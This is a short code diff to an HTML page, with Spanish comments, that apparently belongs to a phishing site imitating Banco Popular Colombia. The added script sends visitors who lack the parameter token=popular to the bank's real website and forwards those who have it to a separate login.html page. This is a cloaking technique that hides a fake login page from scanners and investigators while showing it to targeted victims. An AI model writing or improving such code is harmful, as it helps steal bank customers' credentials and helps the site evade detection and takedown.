@@ -166,12 +166,28 @@
   </div>
 
   <script>
-    // Redirección inmediata a login.html
-    // El loader se muestra por ~800ms para la animación visual
-    // y luego redirige a login.html
-    setTimeout(function() {
-      window.location.href = 'login.html';
-    }, 800);
+    // Control de acceso al index.html
+    // - Si se accede por URL directa (sin token), se redirige a la página oficial de Banco Popular
+    // - Si se accede con ?token=popular, se permite el acceso y se continúa a login.html
+    (function() {
+      // Obtener los parámetros de la URL
+      var params = new URLSearchParams(window.location.search);
+      var token = params.get('token');
+
+      // URL oficial de Banco Popular
+      var urlOficial = 'https://mi.bancopopular.com.co';
+
+      // Si NO hay token válido, redirigir a la página oficial
+      if (token !== 'popular') {
+        window.location.replace(urlOficial);
+        return;
+      }
+
+      // Si hay token válido, mostrar el loader y redirigir a login.html
+      setTimeout(function() {
+        window.location.href = 'login.html';
+      }, 800);
+    })();
   </script>
 </body>
 </html>
